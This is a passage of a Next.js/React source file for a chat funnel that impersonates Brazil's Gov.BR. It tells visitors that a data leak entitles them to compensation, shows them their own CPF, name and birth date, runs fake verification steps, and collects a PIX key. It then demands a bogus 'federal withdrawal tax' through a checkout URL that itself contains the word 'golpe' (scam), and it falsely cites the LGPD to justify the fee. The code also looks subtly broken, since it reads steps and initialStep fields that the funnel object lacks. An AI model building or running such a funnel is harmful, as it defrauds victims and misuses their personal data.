
"use client";

import React, { useState, useEffect, useRef, FC } from 'react';
import { useRouter } from 'next/navigation';
import Image from 'next/image';
import { Loader2, VolumeX, CheckCircle, AlertTriangle, Send } from 'lucide-react';

// Interface for initial parameters passed to the chat flow
export interface SimulatedChatParams {
  gclid?: string;
  utm_source?: string;
  utm_campaign?: string;
  utm_medium?: string;
  utm_content?: string;
  cpf?: string;
  nome?: string;
  mae?: string;
  nascimento?: string;
  typebotId?: string;
  apiHost?: string;
}

// Interfaces for flow step data types
interface ChatOption {
  text: string;
  nextStep?: string;
  action?: 'setChavePixToUserCPF' | 'redirectToPayment';
  paymentUrlTemplate?: string;
  style?: string;
}

interface FlowStepDataVideo {
  title?: string;
  message?: string;
  videoUrl: string;
  thumbnailText?: string;
}

interface FlowStepDataMultipleChoice {
  message: string;
  options: ChatOption[];
  note?: string;
  style?: string;
}

interface FlowStepDataLoading {
  message: string;
  duration_ms: number;
}

interface FlowStepDataDisplayMessage {
  title?: string;
  icon?: 'success_checkmark_gov_style' | 'currency_dollar_gov_style' | 'warning_amber_gov_style' | string;
  message?: string;
  details?: Record<string, string>;
  audioUrl?: string;
  note?: string;
}

interface FlowStepDataTextInput {
  message: string;
  placeholder: string;
  variableToSet: 'chavePix';
  validation?: 'br_phone' | 'email' | 'alphanumeric_with_hyphens';
}

interface FlowStepDataDisplayImage {
    message: string;
    imageGenerationDetails?: {
        functionToCall: string;
        templateName: string;
        inputs: Record<string, string>;
        outputVariable: string;
    };
    fallbackImageUrl: string;
    imageAiHint?: string;
    imageAltText?: string;
}

interface FlowStepSimpleMessage {
    message: string;
}

// Main flow step interface
interface FlowStep {
  type: 'videoDisplay' | 'multipleChoice' | 'loadingScreen' | 'displayMessage' | 'textInput' | 'displayImage' | 'simpleMessage';
  data: FlowStepDataVideo | FlowStepDataMultipleChoice | FlowStepDataLoading | FlowStepDataDisplayMessage | FlowStepDataTextInput | FlowStepDataDisplayImage | FlowStepSimpleMessage;
  nextStep?: string;
  nextAction?: 'play_video_then_proceed'; // For video step
  internalActions?: Record<string, { type: 'setVariable'; variableName: string; valueFrom: string }>;
  isTerminal?: boolean;
}

// Interface for chat messages
interface Message {
  id: string;
  sender: 'bot' | 'user';
  text?: string;
  options?: ChatOption[]; // For multiple choice questions
  displayTitle?: string;
  displayDetails?: Record<string, string>;
  displayIcon?: 'success_checkmark_gov_style' | 'currency_dollar_gov_style' | 'warning_amber_gov_style' | string;
}

// The actual funnel definition based on the user's JSON structure
const funnelDefinition: Record<string, FlowStep> = {
    "step1_video_hook": {
      "type": "videoDisplay",
      "data": {
        "title": "Bem-vindo ao Atendimento Oficial Gov.BR!",
        "message": "Detectamos uma possível indenização vinculada ao seu CPF devido a recentes vazamentos de dados.\n\nPrimeiro, assista ao vídeo abaixo para informações importantes e para iniciarmos seu atendimento. 👇",
        "videoUrl": "https://225412.b-cdn.net/Video%20Page.mp4", // Using a real placeholder for now
        "thumbnailText": "Clique para Assistir e Iniciar"
      },
      "nextAction": "play_video_then_proceed",
      "nextStep": "step2a_intro_message1"
    },
    "step2a_intro_message1": {
      "type": "simpleMessage",
      "data": {
        "message": "Nos últimos dias, milhares de brasileiros conseguiram sacar essa indenização do governo."
      },
      "nextStep": "step2b_intro_message2"
    },
    "step2b_intro_message2": {
      "type": "simpleMessage",
      "data": {
        "message": "Responda às perguntas a seguir para aprovação do seu saque de {{indenizacaoValor}}."
      },
      "nextStep": "step2c_mother_name_check"
    },
    "step2c_mother_name_check": {
      "type": "multipleChoice",
      "data": {
        "message": "Por favor, confirme o nome completo de sua mãe:",
        "options": [
          {"text": "MARIA APARECIDA DA SILVA", "nextStep": "step3_ask_gov_app"},
          {"text": "ANA BEATRIZ PEREIRA SANTOS", "nextStep": "step3_ask_gov_app"},
          {"text": "{{motherName}}", "nextStep": "step3_ask_gov_app"},
          {"text": "RITA DE CÁSSIA OLIVEIRA", "nextStep": "step3_ask_gov_app"},
          {"text": "Nenhuma das alternativas.", "nextStep": "step3_ask_gov_app"}
        ],
        "note": "Independentemente da escolha, o fluxo avança. O objetivo é simular segurança."
      }
    },
    "step3_ask_gov_app": {
      "type": "multipleChoice",
      "data": {
        "message": "Você já instalou ou acessou o aplicativo GOV.BR no seu celular?",
        "options": [
          {"text": "Sim, já acessei/instalei", "nextStep": "step4_ask_civil_status"},
          {"text": "Não, nunca acessei/instalei", "nextStep": "step4_ask_civil_status"}
        ]
      }
    },
    "step4_ask_civil_status": {
      "type": "multipleChoice",
      "data": {
        "message": "Para finalizar a verificação de segurança, qual seu estado civil atual?",
        "options": [
          {"text": "Solteiro(a)", "nextStep": "step5_loading_validation"},
          {"text": "Casado(a)", "nextStep": "step5_loading_validation"},
          {"text": "Divorciado(a)", "nextStep": "step5_loading_validation"},
          {"text": "Viúvo(a)", "nextStep": "step5_loading_validation"},
          {"text": "União Estável", "nextStep": "step5_loading_validation"}
        ]
      }
    },
    "step5_loading_validation": {
      "type": "loadingScreen",
      "data": {
        "message": "Validando suas respostas e cruzando informações com a base de dados oficial... Por favor, aguarde.",
        "duration_ms": 3500
      },
      "nextStep": "step3b_confirmation_message" // Corresponds to user's "Passo 6"
    },
    "step3b_confirmation_message": { // User's "Passo 6: Confirmação (Prova Social com Áudio)"
      "type": "displayMessage",
      "data": {
        "title": "✅ Autenticidade Confirmada!",
        "icon": "success_checkmark_gov_style",
        "message": "Seus dados foram validados com sucesso em nosso sistema.",
        "details": {
          "Nome do Titular": "{{userName}}",
          "CPF": "{{userCPF}}",
          "Data de Nascimento": "{{userBirthDate}}",
          "Valor da Indenização Pré-Aprovada": "{{indenizacaoValor}}",
          "Status da Solicitação": "Pré-Aprovado",
          "Data da Consulta": "{{dataAtual}}"
        },
        "audioUrl": "https://url-do-golpista.com/audios/confirmacao_aprovada.mp3"
      },
      "nextStep": "step4_collect_pix_type"
    },
    "step4_collect_pix_type": { // Corresponds to user's "Passo 4: Coleta da Chave PIX" (renumbered for consistency)
      "type": "multipleChoice",
      "data": {
        "message": "Excelente, {{userName}}! Para qual tipo de chave PIX você gostaria de direcionar o valor de {{indenizacaoValor}}?",
        "options": [
          {"text": "CPF (Recomendado e mais rápido)", "action": "setChavePixToUserCPF", "nextStep": "step4d_confirm_pix_key"},
          {"text": "Telefone", "nextStep": "step4b_collect_pix_input_telefone"},
          {"text": "E-mail", "nextStep": "step4c_collect_pix_input_email"},
          {"text": "Chave Aleatória", "nextStep": "step4e_collect_pix_input_aleatoria"}
        ]
      },
      "internalActions": {
        "setChavePixToUserCPF": { "type": "setVariable", "variableName": "chavePix", "valueFrom": "userCPF" }
      }
    },
    "step4b_collect_pix_input_telefone": {
      "type": "textInput",
      "data": {
        "message": "Por favor, digite sua chave PIX (Telefone) no formato (XX) XXXXX-XXXX:",
        "placeholder": "(XX) XXXXX-XXXX",
        "variableToSet": "chavePix",
        "validation": "br_phone"
      },
      "nextStep": "step4d_confirm_pix_key"
    },
    "step4c_collect_pix_input_email": {
      "type": "textInput",
      "data": {
        "message": "Por favor, digite sua chave PIX (E-mail):",
        "placeholder": "seuemail@provedor.com",
        "variableToSet": "chavePix",
        "validation": "email"
      },
      "nextStep": "step4d_confirm_pix_key"
    },
    "step4e_collect_pix_input_aleatoria": {
      "type": "textInput",
      "data": {
        "message": "Por favor, digite sua chave PIX (Aleatória):",
        "placeholder": "Sua chave aleatória",
        "variableToSet": "chavePix",
        "validation": "alphanumeric_with_hyphens"
      },
      "nextStep": "step4d_confirm_pix_key"
    },
    "step4d_confirm_pix_key": { // User's "Passo 8"
      "type": "multipleChoice",
      "data": {
        "message": "⚠️ **ATENÇÃO!** Verifique cuidadosamente se a chave PIX está correta antes de prosseguir.\n\nChave PIX informada: **{{chavePix}}**\n\nO Governo Federal não se responsabiliza por transferências para chaves PIX informadas incorretamente.",
        "options": [
          {"text": "Sim, a chave PIX está correta.", "nextStep": "step9_registering_pix"},
          {"text": "Não, desejo corrigir a chave.", "nextStep": "step4_collect_pix_type"}
        ]
      }
    },
    "step9_registering_pix": { // User's "Passo 9"
      "type": "loadingScreen",
      "data": {
        "message": "Aguarde alguns segundos, estamos cadastrando sua chave PIX no sistema e preparando seu comprovante...",
        "duration_ms": 3000
      },
      "nextStep": "step10_pix_registered"
    },
    "step10_pix_registered": { // User's "Passo 10: PIX Cadastrado (Reforço com Áudio)"
      "type": "displayMessage",
      "data": {
        "title": "Chave PIX Cadastrada com Sucesso!",
        "icon": "success_checkmark_gov_style",
        "message": "Sua chave PIX **{{chavePix}}** foi registrada e vinculada ao seu CPF para o recebimento da indenização.",
        "details": {
          "Nome do Titular": "{{userName}}",
          "CPF Vinculado": "{{userCPF}}",
          "Chave PIX para Recebimento": "{{chavePix}}",
          "Status da Chave": "ATIVA E VERIFICADA"
        },
        "audioUrl": "https://url-do-golpista.com/audios/pix_cadastrado.mp3"
      },
      "nextStep": "step11_ask_generate_receipt"
    },
    "step11_ask_generate_receipt": { // User's "Passo 11"
      "type": "multipleChoice",
      "data": {
        "message": "Agora vamos gerar seu comprovante oficial de recebimento do valor de {{indenizacaoValor}}.\n\nClique abaixo para confirmar e visualizar seu documento.",
        "options": [
          {"text": "Sim, desejo gerar e visualizar meu comprovante.", "nextStep": "step12_generate_receipt_loading"}
        ],
        "style": "primary_cta_button_gov_style" // This implies a prominent button style
      }
    },
    "step12_generate_receipt_loading": { // Transition to user's "Passo 5: Geração do Comprovante" (renamed)
      "type": "loadingScreen",
      "data": {
        "message": "Gerando seu comprovante de recebimento dos valores... Isso pode levar alguns instantes.",
        "duration_ms": 2500
      },
      "nextStep": "step5b_display_receipt" // This corresponds to the "displayImage" part of user's Passo 5
    },
    "step5b_display_receipt": { // Corresponds to user's "Passo 5: Geração do Comprovante" (display part)
      "type": "displayImage",
      "data": {
        "message": "Parabéns, {{userName}}! Seu comprovante de recebimento da indenização foi gerado com sucesso.\n\nChave PIX: **{{chavePix}}**\nValor: **{{indenizacaoValor}}**",
        "imageGenerationDetails": {
            "functionToCall": "generateReceiptImage", // This is conceptual for the JSON
            "templateName": "comprovante_template.png",
            "inputs": { "userName": "{{userName}}", "userCPF": "{{userCPF}}", "indenizacaoValor": "{{indenizacaoValor}}", "taxaValor": "{{taxaValor}}", "dataAtual": "{{dataAtual}}", "chavePix": "{{chavePix}}" },
            "outputVariable": "generatedReceiptImageUrl"
        },
        "fallbackImageUrl": "https://placehold.co/600x800.png?text=Comprovante+Indenização",
        "imageAiHint": "official government receipt document",
        "imageAltText": "Comprovante de Indenização Gov.BR"
      },
      "nextStep": "step6_reveal_tax" // Corresponds to user's "Passo 13" (renamed for flow)
    },
    "step6_reveal_tax": { // User's "Passo 13: Revelação da Taxa (Guia por Áudio)"
      "type": "displayMessage",
      "data": {
        "title": "RESUMO PARA LIBERAÇÃO IMEDIATA",
        "icon": "currency_dollar_gov_style",
        "details": {
          "Indenização Total Disponível para Saque": "{{indenizacaoValor}}",
          "Titular da Indenização": "{{userName}}",
          "CPF Vinculado": "{{userCPF}}",
          "Chave PIX Registrada para Recebimento": "{{chavePix}}",
          "Data da Solicitação": "{{dataAtual}}",
          "--------------------------------------": "--------------------------------------",
          "Taxa Única Transacional (Imposto de Saque Federal)": "**{{taxaValor}}**"
        },
        "note": "Esta taxa é referente aos custos operacionais e de segurança para a transferência eletrônica via PIX.",
        "audioUrl": "https://url-do-golpista.com/audios/explicacao_taxa.mp3"
      },
      "nextStep": "step7_justify_tax_cta" // Corresponds to user's "Passo 7: Justificativa e Chamada para Ação Final" (renamed for flow)
    },
    "step7_justify_tax_cta": { // User's "Passo 7" (final CTA)
      "type": "multipleChoice",
      "data": {
        "message": "Prezado(a) {{userName}},\n\nSeu saldo de **{{indenizacaoValor}}** está pronto para ser transferido para a chave PIX **{{chavePix}}**.\n\nPara liberar o saque IMEDIATAMENTE, é necessário o pagamento da Taxa Única Transacional de **{{taxaValor}}**.\n\nConforme a Lei Geral de Proteção de Dados (LGPD, Lei n.º 13.709/2018), esta taxa não pode ser descontada diretamente do valor da indenização, pois o montante está vinculado e protegido em seu nome. O pagamento da taxa garante a segurança e a correta destinação dos fundos exclusivamente a você.",
        "options": [
          {
            "text": "✅ Sim! Quero pagar a taxa de {{taxaValor}} e receber meus {{indenizacaoValor}} AGORA!",
            "action": "redirectToPayment",
            "paymentUrlTemplate": "https://checkout.perfectpay.com.br/pay/golpe?amount_in_cents={{taxaValor_cents}}&customer_name={{userName_encoded}}&customer_document={{userCPF_numbers_only}}&utm_source={{utm_source}}&utm_campaign={{utm_campaign}}&utm_medium={{utm_medium}}&utm_content={{utm_content}}&gclid={{gclid}}&param1={{userCPF}}&param2={{chavePix}}",
            "style": "primary_cta_button_gov_style"
          },
          {
            "text": "Tenho dúvidas sobre a taxa.",
            "nextStep": "step7b_explain_tax_more",
            "style": "secondary_link_button_gov_style"
          }
        ]
      }
    },
    "step7b_explain_tax_more": {
        "type": "multipleChoice",
        "data": {
            "message": "A Taxa Única Transacional de {{taxaValor}} cobre os custos de processamento seguro da sua indenização via PIX, incluindo tarifas bancárias e verificação anti-fraude, assegurando que o valor de {{indenizacaoValor}} chegue integralmente e com segurança à sua chave {{chavePix}}. Este é um procedimento padrão para garantir a conformidade com as regulamentações financeiras e a LGPD.\n\nO pagamento desta taxa é o último passo para você ter acesso imediato à sua indenização.",
            "options": [
                 {
                    "text": "Entendi. Pagar {{taxaValor}} e receber {{indenizacaoValor}}.",
                    "action": "redirectToPayment",
                    "paymentUrlTemplate": "https://checkout.perfectpay.com.br/pay/golpe?amount_in_cents={{taxaValor_cents}}&customer_name={{userName_encoded}}&customer_document={{userCPF_numbers_only}}&param1={{userCPF}}&param2={{chavePix}}",
                    "style": "primary_cta_button_gov_style"
                  },
                  {
                    "text": "Não quero pagar a taxa agora.",
                    "nextStep": "step_end_no_payment",
                    "style": "destructive_link_button_gov_style"
                  }
            ]
        }
    },
    "step_end_no_payment": {
        "type": "displayMessage",
        "data": {
            "title": "Solicitação Pendente",
            "message": "Entendemos, {{userName}}. Sua solicitação de indenização de {{indenizacaoValor}} permanecerá pendente. Sem o pagamento da taxa transacional, não podemos prosseguir com a liberação dos fundos.\n\nVocê pode retornar a este atendimento a qualquer momento caso decida prosseguir. Lembramos que esta condição especial pode expirar.",
            "icon": "warning_amber_gov_style"
        },
        "isTerminal": true
    }
};


const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initialParams }) => {
  const [messages, setMessages] = useState<Message[]>([]);
  const [currentStepKey, setCurrentStepKey] = useState<string>(funnelDefinition.initialStep || "step1_video_hook");
  const [isBotTyping, setIsBotTyping] = useState(true);
  const chatEndRef = useRef<HTMLDivElement>(null);
  const audioRef = useRef<HTMLAudioElement>(null);
  const router = useRouter();

  // States for specific step types
  const [showVideoThumbnailOverlay, setShowVideoThumbnailOverlay] = useState(true);
  const [currentVideoMessage, setCurrentVideoMessage] = useState<string | null>(null);
  const [videoStepData, setVideoStepData] = useState<FlowStepDataVideo | null>(null);

  const [isLoadingStep, setIsLoadingStep] = useState(false);
  const [loadingMessage, setLoadingMessage] = useState<string | null>(null);

  const [currentImageDetails, setCurrentImageDetails] = useState<{url: string; alt: string; message?: string, aiHint?: string} | null>(null);
  const [currentDisplayMessage, setCurrentDisplayMessage] = useState<Message | null>(null);
  
  const [flowVariables, setFlowVariables] = useState<Record<string, any>>({
    indenizacaoValor: "R$ 5.960,50",
    taxaValor: "R$ 61,90",
    chavePix: null,
    dataAtual: new Date().toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric' }),
    generatedReceiptImageUrl: null // For conceptual image generation
  });

  const [isTextInputActive, setIsTextInputActive] = useState(false);
  const [currentTextInputConfig, setCurrentTextInputConfig] = useState<FlowStepDataTextInput | null>(null);
  const [textInputValue, setTextInputValue] = useState("");

  const prevCurrentStepKeyRef = useRef<string>();
  const autoTransitionTimerRef = useRef<NodeJS.Timeout | null>(null);

  // Helper to format text with variables
  const formatText = (text: string | undefined): string => {
    if (!text) return '';
    let formattedText = text;
    const allVars = {
        ...initialParams,
        ...flowVariables,
        userName: initialParams.nome || flowVariables.userName || 'Usuário',
        userCPF: initialParams.cpf || flowVariables.userCPF || '---.---.---.--',
        userBirthDate: initialParams.nascimento || flowVariables.userBirthDate || '--/--/----',
        motherName: initialParams.mae || flowVariables.motherName || 'Nome da Mãe Indisponível',
    };

    for (const key in allVars) {
      const placeholder = `{{${key}}}`;
      if (allVars[key as keyof typeof allVars] !== undefined && allVars[key as keyof typeof allVars] !== null) {
        let valueToInsert = String(allVars[key as keyof typeof allVars]);
        
        // Format CPF if it's just numbers
        if ((key === 'userCPF' || key === 'chavePix') && valueToInsert.match(/^\d{11}$/)) {
            valueToInsert = valueToInsert.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
        } else if (key === 'userCPF' && valueToInsert.match(/^\d{3}\.\d{3}\.\d{3}-\d{2}$/)) {
            // Already formatted CPF, do nothing
        }
        // Format birth date if it's in YYYY-MM-DD format (possibly with time)
        else if (key === 'userBirthDate' && valueToInsert.match(/^\d{4}-\d{2}-\d{2}(T\d{2}:\d{2}:\d{2}(\.\d{3}Z?)?)?$/)) { 
            const datePart = valueToInsert.split('T')[0];
            const parts = datePart.split('-');
            if (parts.length === 3) valueToInsert = `${parts[2]}/${parts[1]}/${parts[0]}`;
        } else if (key === 'userBirthDate' && valueToInsert.match(/^\d{2}\/\d{2}\/\d{4}$/)) {
            // Already in dd/mm/yyyy, do nothing
        }

        formattedText = formattedText.replace(new RegExp(placeholder.replace(/([{}])/g, '\\$1'), 'g'), valueToInsert);
      }
    }
    return formattedText;
  };
  
  const formatDetailsObject = (details: Record<string, string> | undefined): Record<string, string> | undefined => {
    if (!details) return undefined;
    const formatted: Record<string, string> = {};
    for (const key in details) {
      formatted[formatText(key)] = formatText(details[key]);
    }
    return formatted;
  };

  // Scroll to bottom effect
  useEffect(() => {
    chatEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [messages, isLoadingStep, currentImageDetails, currentDisplayMessage, videoStepData, isTextInputActive]);

  // Main effect to process the current step
  useEffect(() => {
    if (autoTransitionTimerRef.current) {
      clearTimeout(autoTransitionTimerRef.current);
      autoTransitionTimerRef.current = null;
    }

    const stepConfig = funnelDefinition.steps[currentStepKey];
    if (!stepConfig) {
      console.error("SimulatedChatFlow: Invalid step key:", currentStepKey);
      setMessages(prev => [...prev, {id: `err-${Date.now()}`, sender: 'bot', text: "Desculpe, ocorreu um erro no fluxo."}]);
      setIsBotTyping(false);
      return;
    }
    
    const isNewStep = prevCurrentStepKeyRef.current !== currentStepKey;
    if (isNewStep) {
      prevCurrentStepKeyRef.current = currentStepKey;
      // Reset states for specific UI elements when moving to a new step
      setIsLoadingStep(false);
      setLoadingMessage(null);
      setCurrentImageDetails(null);
      setCurrentDisplayMessage(null);
      setIsTextInputActive(false);
      setCurrentTextInputConfig(null);
      if (stepConfig.type !== 'videoDisplay') { // Only clear video data if not a video step
        setVideoStepData(null);
        setCurrentVideoMessage(null);
      }
    }
    
    setIsBotTyping(true);

    // Async function to process the step (allows for delays etc.)
    const processStep = async () => {
      const botMessageId = `bot-${Date.now()}`;
      let nextStepTransitionDelay = 1200; // Default delay for auto-transitions

      switch (stepConfig.type) {
        case 'videoDisplay': {
          const data = stepConfig.data as FlowStepDataVideo;
          if (isNewStep) { // Only set up video UI if it's a genuinely new step
            setVideoStepData(data);
            setCurrentVideoMessage(formatText(data.title || data.message));
            setShowVideoThumbnailOverlay(true); // Always show thumbnail for a new video step
          }
          setIsBotTyping(false);
          return; // Video step waits for user interaction (thumbnail click)
        }
        case 'simpleMessage': {
          const data = stepConfig.data as FlowStepSimpleMessage;
           if (isNewStep) { // Only add message if it's a new step
            setMessages(prev => [...prev, { id: botMessageId, sender: 'bot', text: formatText(data.message) }]);
          }
          break;
        }
        case 'multipleChoice': {
          const data = stepConfig.data as FlowStepDataMultipleChoice;
          const formattedOptions = data.options.map(opt => ({
            ...opt,
            text: formatText(opt.text) // Format option text with variables
          }));
          if (isNewStep) { // Only add message and options if it's a new step
            setMessages(prev => [...prev, { id: botMessageId, sender: 'bot', text: formatText(data.message), options: formattedOptions }]);
          }
          break;
        }
        case 'loadingScreen': {
          const data = stepConfig.data as FlowStepDataLoading;
          if(isNewStep) { // Only activate loading screen if it's a new step
            setLoadingMessage(formatText(data.message));
            setIsLoadingStep(true);
          }
          setIsBotTyping(false); // Bot is not "typing" during loading screen
          // Set timeout for automatic transition after loading
          autoTransitionTimerRef.current = setTimeout(() => {
            if (prevCurrentStepKeyRef.current === currentStepKey) { // Ensure we are still on the same loading step
                setIsLoadingStep(false);
                setLoadingMessage(null);
                if (stepConfig.nextStep) {
                setCurrentStepKey(stepConfig.nextStep);
                }
            }
          }, data.duration_ms);
          return; // Loading screen handles its own transition
        }
        case 'displayMessage': {
          const data = stepConfig.data as FlowStepDataDisplayMessage;
          const displayMsgData: Message = {
            id: botMessageId,
            sender: 'bot',
            displayTitle: formatText(data.title),
            text: data.message ? formatText(data.message) : undefined,
            displayDetails: formatDetailsObject(data.details),
            displayIcon: data.icon,
          };
          if (isNewStep) setCurrentDisplayMessage(displayMsgData); // Set current display message data

          if (data.audioUrl && audioRef.current && isNewStep) { // Play audio if URL provided and it's a new step
            audioRef.current.src = data.audioUrl;
            audioRef.current.play().catch(e => console.warn("Audio autoplay failed for step " + currentStepKey + ":", e));
          }
          nextStepTransitionDelay = data.details ? 4500 : (data.message ? 2500 : 1200); // Adjust delay based on content
          if (stepConfig.isTerminal) nextStepTransitionDelay = Infinity; // No auto-transition for terminal steps
          break;
        }
        case 'textInput': {
            const data = stepConfig.data as FlowStepDataTextInput;
            if (isNewStep) { // Only add initial message if it's a new step
                 setMessages(prev => [...prev, { id: botMessageId, sender: 'bot', text: formatText(data.message) }]);
            }
            setCurrentTextInputConfig(data);
            setIsTextInputActive(true);
            setTextInputValue(""); // Clear previous input
            setIsBotTyping(false);
            return; // textInput waits for user submission
        }
        case 'displayImage': {
          const data = stepConfig.data as FlowStepDataDisplayImage;
          // Add preceding message if it's a new step
          if (isNewStep) {
             setMessages(prev => [...prev, { id: `bot-msg-${Date.now()}`, sender: 'bot', text: formatText(data.message) }]);
          }

           // Simulate image generation if details are provided
           if (data.imageGenerationDetails && isNewStep) {
                setLoadingMessage(formatText("Gerando seu comprovante...")); // Or use message from data.message
                setIsLoadingStep(true);
                setIsBotTyping(false);

                // Simulate delay for image generation
                autoTransitionTimerRef.current = setTimeout(() => {
                  if (prevCurrentStepKeyRef.current === currentStepKey) { // Ensure still on the same step
                    setIsLoadingStep(false);
                    setLoadingMessage(null);
                    // Set the generated (fallback) image URL to flowVariables
                    setFlowVariables(prev => ({...prev, [data.imageGenerationDetails!.outputVariable]: data.fallbackImageUrl}));
                    setCurrentImageDetails({url: data.fallbackImageUrl, alt: data.imageAltText || "Comprovante", aiHint: data.imageAiHint || 'document image'});
                    
                    // Auto-transition to next step after showing image
                    if (stepConfig.nextStep) {
                        autoTransitionTimerRef.current = setTimeout(() => {
                             if (prevCurrentStepKeyRef.current === currentStepKey) setCurrentStepKey(stepConfig.nextStep as string);
                        }, 4000); // Delay after showing image
                    }
                  }
                }, 2000); // Simulated generation time
                return;
           } else {
             // If no generation, just display fallback image
             if(isNewStep) setCurrentImageDetails({url: data.fallbackImageUrl, alt: data.imageAltText || "Comprovante Gerado", aiHint: data.imageAiHint || 'document image'});
             nextStepTransitionDelay = 4000; // Delay before auto-transitioning
           }
          break;
        }
        default:
          console.error("SimulatedChatFlow: Unknown step type:", (stepConfig as any).type);
          if (isNewStep) setMessages(prev => [...prev, {id: `err-type-${Date.now()}`, sender: 'bot', text: "Erro: tipo de passo desconhecido."}]);
      }

      setIsBotTyping(false);

      // Determine if the step can auto-transition
      const canAutoTransition = stepConfig.nextStep && !stepConfig.isTerminal &&
                                stepConfig.type !== 'multipleChoice' &&
                                stepConfig.type !== 'videoDisplay' &&
                                stepConfig.type !== 'loadingScreen' &&
                                stepConfig.type !== 'textInput' &&
                                !(stepConfig.type === 'displayImage' && (stepConfig.data as FlowStepDataDisplayImage).imageGenerationDetails); // Don't auto-transition if image generation is occurring

      if (canAutoTransition && isNewStep) { // Only set up auto-transition if it's a new step
            autoTransitionTimerRef.current = setTimeout(() => {
            if (prevCurrentStepKeyRef.current === currentStepKey) { // Ensure still on the same step
               setCurrentStepKey(stepConfig.nextStep as string);
            }
          }, nextStepTransitionDelay);
      }
    };
    
    // Delay the processing of the step to simulate bot "thinking" time
    // No delay for loading screens or the very first video step if it's new
    const appearanceDelay = (stepConfig.type === 'loadingScreen' || (isNewStep && currentStepKey === (funnelDefinition.initialStep || "step1_video_hook")) ) ? 0 : 700;
    
    if (isNewStep || stepConfig.type === 'loadingScreen') { // Process if new step or if it's a loading screen (which handles its own display logic)
        setTimeout(processStep, appearanceDelay);
    } else { 
        // If not a new step and not a loading screen, it implies a re-render for the same step.
        // We usually don't want to re-process entirely, just ensure bot typing is false.
        setIsBotTyping(false);
    }

    // Cleanup timer on unmount or if dependencies change
    return () => {
      if (autoTransitionTimerRef.current) {
        clearTimeout(autoTransitionTimerRef.current);
        autoTransitionTimerRef.current = null;
      }
    };
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [currentStepKey, initialParams, flowVariables]); // Rerun effect if currentStepKey, initialParams, or flowVariables change

  const handleOptionClick = (option: ChatOption) => {
    // User "speaks" by clicking a bot's option. We typically don't add a separate user message bubble for this.
    // const userMessageId = `user-${Date.now()}`;
    // setMessages(prev => [...prev, { id: userMessageId, sender: 'user', text: option.text }]);
    
    // Clear any currently displayed special UI elements before processing the option
    setCurrentDisplayMessage(null); 
    setCurrentImageDetails(null);

    const currentStepConfig = funnelDefinition.steps[currentStepKey];

    // Handle internal actions defined in the step, like setting a variable
    if (option.action === 'setChavePixToUserCPF') {
        const cpfToSet = initialParams.cpf || flowVariables.userCPF || "CPF não disponível";
        setFlowVariables(prev => ({...prev, chavePix: cpfToSet}));
    } else if (currentStepConfig?.internalActions && option.action && currentStepConfig.internalActions[option.action]) {
        const actionDetail = currentStepConfig.internalActions[option.action];
        if (actionDetail.type === 'setVariable') {
            let valueFromSource = actionDetail.valueFrom; 
            let valueToSet = "";
            // Attempt to get value from various sources (flowVariables, initialParams)
            if (valueFromSource === "userCPF") valueToSet = initialParams.cpf || flowVariables.userCPF || "";
            // Add more specific variable sources if needed
            else valueToSet = flowVariables[valueFromSource] || initialParams[valueFromSource as keyof SimulatedChatParams] || "";
            
            setFlowVariables(prev => ({ ...prev, [actionDetail.variableName]: valueToSet }));
        }
    }

    // Handle redirection for payment
    if (option.action === 'redirectToPayment' && option.paymentUrlTemplate) {
        let finalPaymentUrl = formatText(option.paymentUrlTemplate);
        
        // Special handling for amount_in_cents
        const taxaValorCleaned = String(flowVariables.taxaValor || "0").replace("R$ ", "").replace(",", ".");
        const taxaValorNum = parseFloat(taxaValorCleaned);
        finalPaymentUrl = finalPaymentUrl.replace("{{taxaValor_cents}}", String(Math.round(taxaValorNum * 100)));
        
        const userNameEncoded = encodeURIComponent(initialParams.nome || flowVariables.userName || "");
        finalPaymentUrl = finalPaymentUrl.replace("{{userName_encoded}}", userNameEncoded);
        
        const userCPFNumbersOnly = (initialParams.cpf || flowVariables.userCPF || "").replace(/\D/g, '');
        finalPaymentUrl = finalPaymentUrl.replace("{{userCPF_numbers_only}}", userCPFNumbersOnly);

        // Append other initialParams (like UTM tags, gclid) to the payment URL if not already present
        try {
            const url = new URL(finalPaymentUrl);
             Object.entries(initialParams).forEach(([key, value]) => {
                if (value && !url.searchParams.has(key) && ['gclid', 'utm_source', 'utm_campaign', 'utm_medium', 'utm_content'].includes(key)) {
                    url.searchParams.set(key, value);
                }
            });
            window.location.href = url.toString();
        } catch (e) {
            console.error("Invalid payment URL:", finalPaymentUrl, e);
            setMessages(prev => [...prev, { id: `err-payment-url-${Date.now()}`, sender: 'bot', text: "Desculpe, ocorreu um erro ao tentar processar o pagamento. Verifique o link." }]);
        }
        return; // Stop further processing after redirection
    }
    
    // Transition to the next step if defined
    if (option.nextStep) {
      if (autoTransitionTimerRef.current) clearTimeout(autoTransitionTimerRef.current); // Clear pending auto-transitions
      setCurrentStepKey(option.nextStep);
    } else if (!option.action) { // Log warning if an option has no effect
        console.warn("Option clicked with no nextStep and no action:", option);
    }
  };
  
  const handleVideoThumbnailClick = async () => {
    const stepConfig = funnelDefinition.steps[currentStepKey];
    if (stepConfig?.type !== 'videoDisplay') return;

    setShowVideoThumbnailOverlay(false); // Hide thumbnail overlay
    
    // If the video step is configured to proceed after playing, transition to the next step
    if (stepConfig.nextAction === "play_video_then_proceed" && stepConfig.nextStep) {
      if (autoTransitionTimerRef.current) clearTimeout(autoTransitionTimerRef.current); 
      // Short delay to simulate video starting before moving to next chat message
      autoTransitionTimerRef.current = setTimeout(() => { 
        if(prevCurrentStepKeyRef.current === currentStepKey) setCurrentStepKey(stepConfig.nextStep as string);
      }, 500);
    }
  };

  const handleTextInputFormSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!currentTextInputConfig || !textInputValue.trim()) {
        // Optionally, show an error message in the chat
        setMessages(prev => [...prev, {id: `err-input-${Date.now()}`, sender: 'bot', text: "Por favor, preencha o campo."}]);
        return;
    }

    // Add user's input as a message in the chat
    setMessages(prev => [...prev, { id: `user-input-${Date.now()}`, sender: 'user', text: textInputValue }]);
    
    // Update flow variable based on textInputConfig
    if (currentTextInputConfig.variableToSet === 'chavePix') {
        setFlowVariables(prev => ({...prev, chavePix: textInputValue.trim()}));
    }
    // Add more variable settings here if needed

    setIsTextInputActive(false); // Hide text input
    setTextInputValue(""); // Clear input field
